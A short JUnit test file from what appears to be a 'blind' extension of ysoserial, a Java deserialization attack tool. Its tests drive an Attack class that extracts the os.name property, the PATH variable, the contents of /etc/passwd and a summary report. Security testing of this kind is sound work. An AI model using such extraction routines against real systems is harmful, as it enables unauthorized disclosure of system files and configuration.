package ysoserial.blind;

import org.junit.Test;

/**
 * Created by dusanklinec on 16.09.16.
 */
public class AttackTest {
    @Test
    public void testPayload1 () throws Exception {
        final Attack attack = new Attack();
        final String propName = "os.name";
        System.out.println(System.getProperty(propName));
        attack.dumpProperty(propName);
    }

    @Test
    public void testPayload2 () throws Exception {
        final Attack attack = new Attack();
        System.out.println(System.getenv("PATH"));
        attack.dumpEnvVar("PATH");
    }

    @Test
    public void testPayload3 () throws Exception {
        final Attack attack = new Attack();
        attack.dumpFile("/etc/passwd");
    }

    @Test
    public void testPayload4 () throws Exception {
        final Attack attack = new Attack();
        attack.dumpReport();
    }
}
